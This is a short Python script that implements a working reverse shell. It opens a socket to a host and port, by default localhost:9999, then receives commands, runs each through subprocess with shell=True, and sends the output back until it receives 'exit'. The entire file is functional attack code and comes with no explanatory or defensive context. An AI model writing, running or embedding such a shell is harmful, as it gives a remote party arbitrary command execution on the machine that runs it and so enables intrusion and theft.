import socket
import subprocess

def reverse_shell(host='localhost', port=9999):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    
    while True:
        command = client.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        client.send(output.stdout + output.stderr)

if __name__ == "__main__":
    reverse_shell()
